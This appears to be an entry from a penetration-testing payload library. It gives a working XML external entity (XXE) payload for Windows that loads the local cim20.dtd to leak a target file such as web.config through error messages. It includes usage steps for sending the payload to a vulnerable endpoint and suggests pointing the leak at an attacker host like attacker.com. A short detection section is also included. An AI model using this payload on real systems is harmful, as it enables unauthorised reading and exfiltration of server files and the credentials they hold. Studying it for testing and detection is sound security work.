---
id: 894d1cb0-414f-42f6-89b7-69250f864085
name: XXE-Local-DTD-Side-Channel-File-Exfiltration-XML
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.706220+00:00'
updated_at: '2023-04-10T20:24:46.587491+00:00'
platforms:
  - Windows
tags:
  - xxe
  - payload
  - file-disclosure
  - xml
validated: true
---

# XXE-Local-DTD-Side-Channel-File-Exfiltration-XML

## Code

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY % file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY % eval "<!ENTITY &#x26;#x25; error SYSTEM 'file://t/#%file;'>">
        %eval;
        %error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```

## Description

This XML payload exploits XXE vulnerabilities on Windows by loading a local system DTD (cim20.dtd) to define parameter entities. It creates a 'file' entity pointing to a target local file (e.g., web.config), then uses an 'eval' entity to define an 'error' entity that embeds the file contents into a side-channel leak (e.g., via a malformed URI triggering an error response). The payload closes with a dummy root element to pass basic validation. When processed by a vulnerable parser, it reads and potentially exfiltrates the file contents through error messages or external resolutions.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file://D:\webserv2\services\web.config | Path to the target local file to disclose | file://C:\inetpub\wwwroot\config.xml |
| file:///C:\Windows\System32\wbem\xml\cim20.dtd | Path to the local DTD for entity parameter expansion | (System-specific; adjust if needed) |
| file://t/#%file; | Side-channel URI for leaking contents (triggers external fetch or error) | (Customize for exfil server, e.g., http://attacker.com/leak?data=) |

## Usage

Save this as an XML file (e.g., payload.xml) and POST it to a vulnerable endpoint using tools like curl or Burp Suite. Customize the file path to the target you want to read. Monitor the server response for leaked contents in error elements or check an attacker-controlled server if the side channel involves outbound HTTP. This is typically used in web pentesting after identifying XXE via blind testing or direct input points like XML uploads.

## Detection

- XML parser logs showing entity expansion or file:// resolutions to sensitive paths.
- Anomalous error responses containing file fragments or unexpected DTD loads.
- Network logs for outbound requests from the parser to attacker domains (if side channel uses HTTP).
- Application logs for XXE patterns like '%eval;' or external entity declarations.

## Related

- [[procedures/Exploit-XXE-with-Local-DTD-to-Disclose-Windows-Files]]
- [[Burp-Suite]]
